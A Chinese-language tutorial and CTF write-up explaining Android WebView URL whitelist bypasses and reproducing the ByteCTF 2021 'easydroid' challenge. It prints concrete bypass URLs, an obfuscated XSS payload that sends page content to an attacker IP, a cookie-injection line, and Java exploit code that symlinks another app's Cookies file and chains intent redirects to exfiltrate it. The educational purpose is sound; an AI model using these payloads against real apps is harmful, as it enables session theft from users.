本文主要讲解Android-WebView中的一个漏洞点，从介绍WebView到成功利用。通过复现ByteCtf2021中的一道漏洞题来对知识进行巩固。

什么是WebView？
===========

Android内置webkit内核的高性能浏览器,而WebView则是在这个基础上进行封装后的一个 控件,WebView直译网页视图,我们可以简单的看作一个可以嵌套到界面上的一个浏览器控件。也就是说，我们可以直接在app中拉起一个网页，这样方便快捷，同时也可以减少开发量，当然也会存在安全问题。

**webview的使用方式**

//方式一：加载一个网页  
webView.loadUrl("<http://www.baidu.com>");  
​  
//方式二：加载应用资源文件内的网页  
webView.loadUrl("file:///data/local/tmp/xx.html");  
​  
//方式三：加载一段代码  
webView.loadData(String data,String mimeType, String encoding);

我们使用下面这段代码来启动一个网页：

@Override  
protected void onCreate(Bundle savedInstanceState) {  
 super.onCreate(savedInstanceState);  
 data = Uri.parse("<http://www.baidu.com>");  
 WebView webView = new WebView(getApplicationContext());  
 setContentView(webView);  
 webView.getSettings().setJavaScriptEnabled(true);  
 webView.loadUrl(data.toString());  
}  
记得添加网络权限：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-0957a2cfb2ed2d51eb3efaca07bbb14907579867.png)

WebView白名单绕过
============

要使用webview加载资源，那么总会有一些要过滤的情况，如果校验不完整，则会导致加载恶意的资源。

在这之前，我们先来看一下URL的格式和URi的一些接口。

URL的一般格式为:  
[scheme&gt;://&lt;user&gt;:&lt;password&gt;@&lt;host](mailto:scheme):&lt;port&gt;/&lt;path&gt;:&lt;params&gt;?&lt;query&gt;#&lt;frag&gt;  
​  
String uri = "<https://www.baidu.com/>  
Uri mUri = Uri.parse(uri);  
​  
// 协议  
String scheme = mUri.getScheme();  
// 域名+端口号+路径+参数  
String scheme\_specific\_part = mUri.getSchemeSpecificPart();  
// 用户信息+域名+端口号  
String authority = mUri.getAuthority();  
// fragment  
String fragment = mUri.getFragment();  
// 域名  
String host = mUri.getHost();  
// 端口号  
int port = mUri.getPort();  
// 路径  
String path = mUri.getPath();  
// 参数  
String query = mUri.getQuery();

**常见的校验方式与绕过方式**

一、  
if(!url.startsWith("http://")){  
 webView.loadUrl(url);  
}  
​  
大小写绕过：Http  
前面加空格绕过： http  
   
二、  
if(url.contains("baidu")){  
 webView.loadUrl(url);  
}

绕过：<http://www.google.com#baidu>
================================

?绕过：<http://www.google.com?baidu>  
   
三、  
if(Uri.parse(url).getAuthority().contains("baidu"){  
webView.loadUrl(url);  
}  
   
绕过：[http://baidu@www.google.com](http://www.google.com)  
   
四、  
if(Uri.parse(url).getHost().endsWith("baidu.com")){  
 webView.loadUrl(url);  
}  
   
if(Uri.parse(url).getHost().contains("baidu.com")) {  
webView.loadUrl(url);  
}  
申请域名绕过：<http://xxxxxbaidu.com>

前两个很容易理解，简单说一下第三个和第四个绕过方式。

第三个：在上面我们说了getAuthority获取的是`<user>:<password>@<host>:<port>`这一部分,如果网站没有user，password的校验，则这一部分会被忽略，写与不写不影响网站访问。所以我们将校验的关键词写在这一部分就可以绕过了。

第四个：因为这一校验方式中存在.com，所以不容易绕过，但是我们仍然可以申请一个新的域名，只要包含或者以baidu.com结尾就可以绕过了。

更多有趣的绕过可以参考：《一文彻底搞懂安卓WebView白名单校验》

通过XSS窃取Cookies
==============

在app中加载exp.html：

Uri data = Uri.parse("<http://192.168.43.164/exp.html>");  
WebView webView = new WebView(getApplicationContext());  
setContentView(webView);  
webView.getSettings().setJavaScriptEnabled(true);  
webView.loadUrl(data.toString());

在Android中，使用WebView加载网站时，当在网站停留20~40秒事，网站的Cookie就会保存在/data/data/com.example.test/app\_webview/Cookies文件下。

而下面这段代码可以将整个exp.html的内容发送到指定的地址：

&lt;img src="x" onerror="eval(atob('bmV3IEltYWdlKCkuc3JjID0gImh0dHA6Ly8xOTIuMTY4LjQzLjE2NDo4MC8/Y29va2llPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwiKVswXS5pbm5lckhUTUwpOw=='))"&gt;  
​  
base64解码后为：  
new Image().src = "[http://192.168.43.164:80/?cookie](http://192.168.43.164/?cookie)=" + encodeURIComponent(document.getElementsByTagName("html")\[0\].innerHTML);

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-df4594586e52427af51bcd308eb33305305ba118.png)

假如我们把这段代码插入到Cookies文件中，并且让这段xss执行，那么就可以将Cookies文件中的所有数据都拿到。

由此得出两个问题：

1\. 如何将这段代码插入到Cookies中？  
1\. 这段代码在Cookies文件中是不会执行的，如何让这段xss执行？

我们先保留问题，继续往下看，进入漏洞复现环节。

漏洞利用
====

我们使用ByteCtf中的easydroid题目案例进行讲解。

MainActivity中的代码:

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-c53cabad89fa7c4a0ebc35be1b1632419d7bb4db.png)

可以得到信息：加载网站，对URL进行校验，可以执行JavaScript。

**shouldOverrideUrlLoading接口**

该接口主要是给WebView提供时机，可以拦截URL做一些其他操作。

该接口的返回值是关键，True（拦截WebView加载Url，选择浏览器打开），False（允许WebView直接加载Url）

在这里是对URL进行拦截并解析，然后使用startActivity来启动Intent。

TestActivity中的代码：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-849ba49c2fac8d324e54ed2309c8395bb0e9569a.png)

获取数据，使用webview加载。

代码很简短，我们整理思路，来理清攻击链。

上面我们介绍了通过xss来窃取Cookies，并提出了两个问题，现在我们就是要解决这两个问题。  
1.如何将这段代码插入到Cookies中？  
我们知道可以通过document.cookie = "xxxxxxx"来设置cookie，而这cookie的值会被存放到Cookies文件中，所以我们可以通过这样的方式将我们的攻击代码插入到Cookies文件中。  
document.cookie = "x = '&lt;img src=\\"x\\" onerror=\\"eval(atob('bmV3IEltYWdlKCkuc3JjID0gImh0dHA6Ly8xOTIuMTY4LjQzLjE2NDo4MC8/Y29va2llPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwiKVswXS5pbm5lckhUTUwpOw=='))\\"&gt;'"  
​  
2.这段代码在Cookies文件中是不会执行的，如何让这段xss执行？  
JS代码在html文件中会执行，所以我们要想办法将Cookies中的内容存放到一个html文件中。这里采用的是符号链接的方式,谷歌官方提出修复方法时已经给出了思路([https://support.google.com/faqs/answer/9084685)，所以我们可以将Cookies文件与一个html文件进行符号链接](https://support.google.com/faqs/answer/9084685)%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%B0%86Cookies%E6%96%87%E4%BB%B6%E4%B8%8E%E4%B8%80%E4%B8%AAhtml%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5)。  
​  
建立一个easydroid.html，它里面有两个重定向：一个是设置Cookie，一个是加载与Cookies文件符号链接后的那个html文件。  
在shouldOverrideUrlLoading中，重定向时会通过parseUri解析intent，这里利用了Android-Intent重定向的知识，在之前的文章中已经进行了学习([https://www.freebuf.com/articles/web/325314.html)。toUri与parseUri正好相反，可以使用toUri来得到攻击代码](https://www.freebuf.com/articles/web/325314.html)%E3%80%82toUri%E4%B8%8EparseUri%E6%AD%A3%E5%A5%BD%E7%9B%B8%E5%8F%8D%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8toUri%E6%9D%A5%E5%BE%97%E5%88%B0%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81)。  
通过重定向进入到了TestActivity中，然后获取数据，使用loadUrl加载。

理清思路后，我们来看一下攻击代码：

protected void onCreate(Bundle savedInstanceState) {  
 super.onCreate(savedInstanceState);  
 setContentView(R.layout.activity\_main);  
 symlink();  
 Intent intent \\= new Intent();  
 intent.setClassName("com.bytectf.easydroid","com.bytectf.easydroid.MainActivity");  
 intent.setData(Uri.parse("[http://toutiao.com@192.168.43.164/easydroid.html](http://192.168.43.164/easydroid.html)"));  
 startActivity(intent);  
}  
​  
​  
private String symlink() {  
 try {  
 String root \\= getApplicationInfo().dataDir;  
 String symlink \\= root + "/symlink.html";  
 String cookies \\= getPackageManager().getApplicationInfo("com.bytectf.easydroid", 0).dataDir + "/app\_webview/Cookies";  
​  
 Runtime.getRuntime().exec("rm " + symlink).waitFor();  
 Runtime.getRuntime().exec("ln -s " + cookies + " " + symlink).waitFor();  
 Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor();  
​  
 return symlink;  
 } catch (Throwable th) {  
 throw new RuntimeException(th);  
 }  
}

整个漏洞利用流程：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-604c9ddc95f74b23660eb51931dc70712d6ea2dc.png)

首先创建了符号链接，然后过URL校验，访问我们的服务器`http://192.168.43.164/easydroid.html`:

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-bc66197bd7d6baa19767fef38c6e08f3b60df8fb.png)

通过Intent重定向，首先加载exp.html来设置cookie，然后再加载symlink.html，将所要Cookies内容返回给我们的服务器。最终达到窃取Cookies的目的。注意，这里要保证setAllowFileAccess(true)，API 29以下默认为true，否则会利用失败。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-34f9cee12ba2a001fa4fcc482d15a5908b1b188f.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-7db4c4ed26ee506359d2d454bb389ba0c0c0ff8f.png)

### 参考

<https://shvu8e0g7u.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg>  
<https://www.cnblogs.com/rebeyond/p/10916076.html>  
<https://support.google.com/faqs/answer/9084685>  
<https://blog.csdn.net/zxc024000/article/details/90298159>  
<https://www.runoob.com/w3cnote/android-tutorial-webview.html>